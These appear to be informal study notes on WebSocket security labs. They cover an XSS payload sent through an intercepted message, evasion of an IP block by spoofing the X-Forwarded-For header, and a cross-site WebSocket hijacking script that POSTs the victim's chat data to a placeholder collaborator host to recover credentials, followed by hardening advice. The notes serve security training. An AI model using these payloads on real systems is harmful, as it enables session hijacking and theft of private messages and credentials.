**WebSocket** is a way to create a **constant two-way connection** between the browser and the server. It lets them **send data back and forth instantly** without needing to make new requests every time — making apps **faster and more real-time**. used in live chats

1. send a message intercept it and modify to message to 
`<img src=1 onerror='alert(1)'>`

2. this lab is about header injection so if u intercept the request and try to send that xss payload `<img src=1 onerror='alert(1)'>` and then your ip will get blocked for dedicated the attack 
then you hit reconnect to connect again and injection this header to the request `X-Forwarded-For: 1.1.1.1` then try again to attack by a different payload <img src=1 oNeRrOr=alert1> and hit send it will work 

3. **Lab: Cross-site WebSocket hijacking: so in this lab you trying to see the chat history of the victim, go to the exploit server and paste the websoket template**  

`<script>
var ws = new WebSocket('wss://example.com/chat');
ws.onopen = function() {
ws.send("READY");
};
ws.onmessage = function(event) {
fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
method: 'POST',
mode: 'no-cors',
body: event.data
});
};
</script>`
 put your collaborator and send it to the victim, pull now on collaborator analyze the chat history and decode it as html decoding then fetch the credentials.

## **How to secure a WebSocket connection**

To minimize the risk of security vulnerabilities arising with WebSockets, use the following guidelines:

- Use the `wss://` protocol (WebSockets over TLS).
- Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
- Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
- Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.
